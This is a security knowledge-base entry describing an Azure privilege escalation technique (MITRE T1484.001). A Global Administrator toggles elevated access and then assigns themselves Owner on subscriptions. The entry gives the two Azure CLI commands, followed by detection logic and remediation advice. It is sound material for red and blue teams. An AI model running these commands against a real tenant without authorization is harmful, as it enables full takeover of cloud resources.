# [PE-POLICY-003]: Azure Management Group Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-003 |
| **MITRE ATT&CK v18.1** | [Domain Policy Modification (T1484.001)](https://attack.mitre.org/techniques/T1484/001/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / Azure |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** By default, Global Administrators in Entra ID do not have access to Azure Subscriptions. However, they can toggle the "Access management for Azure resources" switch in the Entra portal. This grants them the **User Access Administrator** role at the **Root Management Group (`/`)** scope. From there, they can assign themselves "Owner" on *any* subscription in the tenant, effectively taking over all cloud workloads.
- **Attack Surface:** Entra ID Tenant Settings.
- **Business Impact:** **Total Cloud Compromise**. Access to every subscription, VM, and database.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Global Administrator.
- **Tools:**
    - Azure Portal / CLI

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Elevate Access**
```bash
az rest --method post --url "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"
```
*Effect: Adds `User Access Administrator` at Root Scope.*

**Step 2: Assign Owner**
Now assign yourself Owner on a target subscription.
```bash
az role assignment create --assignee <MyObjectID> --role "Owner" --scope "/subscriptions/<SubID>"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Azure Activity Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Directory Activity** | `ElevateAccess` | Operation: `Microsoft.Authorization/elevateAccess/action`. Actor is a Global Admin. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **PIM:** Enforce **Privileged Identity Management (PIM)** for the Global Administrator role. Require MFA and justification to activate it.
*   **Monitoring:** Alert immediately on the `elevateAccess` action. This should only happen in "Break Glass" scenarios.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [CA-UNSC-007]
